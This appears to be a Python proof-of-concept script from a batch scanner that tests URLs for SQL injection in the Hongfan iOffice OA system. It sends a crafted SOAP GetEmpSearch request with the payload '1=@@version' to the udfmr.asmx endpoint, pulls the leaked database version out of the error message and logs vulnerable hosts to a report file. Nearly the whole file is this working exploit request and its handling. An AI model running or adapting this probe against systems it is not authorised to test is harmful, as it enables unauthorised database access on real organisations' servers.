import requests
import time
import buter
import wirtefile
import xml.etree.ElementTree as ET
filename = "./reps/红帆OAsql注入-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Content-Type": "text/xml; charset=utf-8"
    }
data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope 	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr"> <condition>1=@@version</condition>
</GetEmpSearch>
</soap:Body>
</soap:Envelope>
        '''
poc = "/iOffice/prg/set/wss/udfmr.asmx"

def ioffOAsql(url):
    try:
        reps = requests.post(url=url+poc, headers=headers, data=data, timeout=3, verify=False)
        if "nvarchar" in reps.text:
            reptext = reps.text
            root = ET.fromstring(reptext)
            value = root.find(".//faultstring").text.strip().split("'")[1]
            output = f"{url}\n{value}"
            print(buter.colors.GREEN + f"存在红帆OAsql注入 url : {output}" + buter.colors.END)
            wirtefile.writefiles(filename,output)
        else:
            print(buter.colors.RED+ f"未发现红帆OAsql注入 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
